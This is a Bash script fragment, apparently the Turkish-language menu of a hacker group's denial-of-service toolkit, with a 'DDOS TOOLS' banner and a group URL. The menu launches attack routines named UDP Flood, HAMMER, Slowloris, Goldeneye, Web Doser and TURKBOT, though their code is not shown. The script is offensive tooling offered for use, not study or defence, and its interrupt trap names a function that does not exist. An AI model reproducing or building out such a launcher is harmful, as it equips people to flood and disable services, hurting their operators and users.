exit_script1()
{
  exit 1
}

Take_input1()
{
clear
while :
do
clear
echo -e "${WHITE}${RED}     "                     
echo -e "${WHITE} https://darksecarmy.com                                               
                           "${WHITE}TURKISH MUSLIM HACKERS "${GREEN} "${RED}[NO EDIT]
echo -e "${WHITE}
╔╦╗╔╦╗╔═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╔═╗ ${RED}
 ║║ ║║║ ║╚═╗   ║ ║ ║║ ║║  ╚═╗ ${CYAN}
═╩╝═╩╝╚═╝╚═╝   ╩ ╚═╝╚═╝╩═╝╚═╝  CODED BY YANLIZ KURT${WHITE}
"${WHITE}
    echo -e "${WHITE}Note: "${GREEN}CTRL + Z,C YAPAZAR SCRIPTDEN CIKIS YAPABILIRSINIZ
    echo -e "${WHITE}"
	echo -e "${LIGHTBLUE}[1]${PURPLE}Twiks${LIGHTBLUE}                                                 [5]${GREEN}TURKBOT${LIGHTBLUE}"
    echo -e "${LIGHTBLUE}[2]${GREEN}UDP Flood${LIGHTBLUE}                                             [6]${RED}Web Doser${BLUE}"
    echo -e "${LIGHTBLUE}[3]${WHITE}HAMMER${LIGHTBLUE}                                                [7]${LIGHTBLUE}Goldeneye${CYAN}"
    echo -e "${LIGHTBLUE}[4]${BLUE}SLOWLORIS${LIGHTBLUE}                                             [8]${GREEN}TITANIUM SCRIPT${LIGHTBLUE}"                                                               
    echo -n "Menuden Scriptleri Secebilirsiniz [1 - 8] "
    read yourch
    case $yourch in
      1) Twiks ;;
      2) udp_flood ;;
      3) hammer ;;
	  4) slowloris ;;
	  8) nytro ;;
         5) TURKBOT ;;
         6) Attack ;;
	  7) goldeneye ;;
      ex) echo "As you Command" ;  exit 1  ;;
      *) echo "HATALI RAKAM GIRDINIZ" ;
         echo "Enter Basarak Menuye Dönebilirsiniz . . ." ; read ;;
 esac
done # end_while
}
#
# Set trap to for CTRL+C interrupt i.e. Install our error handler
# When occurs it first it calls del_file() and then exit
#
trap exit_script 2
#
# Call our user define function : Take_input1
#
Take_input1
